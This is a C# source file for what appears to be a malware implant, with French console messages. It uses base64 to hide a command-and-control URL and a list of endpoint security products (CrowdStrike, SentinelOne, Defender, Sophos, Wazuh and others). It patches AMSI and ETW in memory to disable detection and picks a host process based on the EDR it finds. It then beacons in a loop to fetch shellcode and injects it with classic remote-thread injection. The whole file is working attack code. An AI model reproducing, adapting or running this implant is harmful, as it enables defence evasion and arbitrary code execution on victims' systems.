using System;
using System.Diagnostics;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Management;

class xA
{
    static readonly string z0 = Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cDovLzEyNy4wLjAuMTo1MDAwL2FwaS9iZWFjb24=")); // C2 URL
    static readonly string z1 = Encoding.UTF8.GetString(Convert.FromBase64String("YWdlbnQta2lsbHNoaWZ0LTAwMQ==")); // Agent ID

    static async Task Main()
    {
        b0();

        string[] l0 = new[] {
            "U2VudGluZWxBZ2VudA==", "U2VudGluZWxPbmU=", "bWNzaGllbGQ=", "bWZlbW1z", "bWFzdmM=", "bWNhZ2VudA==",
            "Q1NGYWxjb25TZXJ2aWNl", "Q3Jvd2RTdHJpa2U=", "ZmFsY29uZA==",
            "TXNNcEVuZw==", "U2Vuc2U=", "TXBDbXRSdW4=", "U2VjdXJpdHlIZWFsdGhTZXJ2aWNl",
            "U29waG9zVUk=", "U0FWQWRtaW5TZXJ2aWNl", "U0FWU2VydmljZQ==", "U29waG9zRlM=", "U29waG9zSGVhbHRo", "c29waG9zY2xlYW4=", "SGl0bWFuUHJvLkFsZXJ0",
            "b3NzZWMtYWdlbnQ=", "d2F6dWgtYWdlbnQ=", "d2F6dWgtbW9kdWxlc2Q=", "b3NzZWMtYXV0aGQ="
        }.Select(x => Encoding.UTF8.GetString(Convert.FromBase64String(x))).ToArray();

        var l1 = Process.GetProcesses()
            .Where(p => l0.Contains(p.ProcessName, StringComparer.OrdinalIgnoreCase))
            .Select(p => p.ProcessName)
            .Distinct()
            .ToList();

        if (y1())
        {
            l1.Add("Sense (WMI)");
        }

        if (l1.Any())
        {
            Console.WriteLine("[!] EDR détecté : " + string.Join(", ", l1));
        }
        else
        {
            Console.WriteLine("[+] Aucun EDR détecté connu");
        }

        string tP = "dllhost";
        if (l1.Any(p => p.Contains("Sense")))
            tP = "explorer";
        else if (l1.Any(p => p.Contains("CrowdStrike") || p.Contains("CSFalcon")))
            tP = "notepad";
        else if (l1.Any(p => p.Contains("Sophos")))
            tP = "conhost";
        else if (l1.Any(p => p.Contains("wazuh") || p.Contains("ossec")))
            tP = "svchost";

        int pID = sP(tP);
        if (pID == 0)
        {
            Console.WriteLine("[-] Processus échec");
            return;
        }

        while (true)
        {
            try
            {
                using HttpClient c = new HttpClient();
                c.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0");

                string q = z1 + "|BEACON_SHELLCODE";
                var d = new StringContent(q, Encoding.UTF8, "text/plain");
                var r = await c.PostAsync(z0, d);

                byte[] pl = await r.Content.ReadAsByteArrayAsync();
                if (pl.Length > 0)
                {
                    bool ok = inj(pID, pl);
                    string res = z1 + (ok ? "|[+] Injection OK" : "|[-] Injection KO");
                    await c.PostAsync(z0, new StringContent(res, Encoding.UTF8, "text/plain"));
                }
            }
            catch { }

            await Task.Delay(new Random().Next(30000, 60000));
        }
    }

    static bool inj(int p, byte[] pl)
    {
        IntPtr h = OpenProcess(0x001F0FFF, false, p);
        if (h == IntPtr.Zero) return false;

        IntPtr a = VirtualAllocEx(h, IntPtr.Zero, (uint)pl.Length, 0x3000, 0x40);
        if (a == IntPtr.Zero) return false;

        WriteProcessMemory(h, a, pl, pl.Length, out _);
        CreateRemoteThread(h, IntPtr.Zero, 0, a, IntPtr.Zero, 0, out _);
        return true;
    }

    static int sP(string n)
    {
        try
        {
            var p = Process.Start(n + ".exe");
            p.WaitForInputIdle();
            return p.Id;
        }
        catch { return 0; }
    }

    static void b0()
    {
        try
        {
            IntPtr l = LoadLibrary("amsi.dll");
            IntPtr f = GetProcAddress(l, "AmsiScanBuffer");
            VirtualProtect(f, (UIntPtr)6, 0x40, out _);
            Marshal.Copy(new byte[] { 0x48, 0x31, 0xC0, 0xC3 }, 0, f, 4);
        }
        catch { }

        try
        {
            IntPtr l2 = LoadLibrary("ntdll.dll");
            IntPtr f2 = GetProcAddress(l2, "EtwEventWrite");
            VirtualProtect(f2, (UIntPtr)6, 0x40, out _);
            Marshal.Copy(new byte[] { 0xC3 }, 0, f2, 1);
        }
        catch { }
    }

    static bool y1()
    {
        try
        {
            var s = new ManagementObjectSearcher("SELECT * FROM Win32_Service WHERE Name='Sense'");
            return s.Get().Count > 0;
        }
        catch { return false; }
    }

    [DllImport("kernel32.dll")] static extern IntPtr LoadLibrary(string lpFileName);
    [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")] static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll")] static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
}
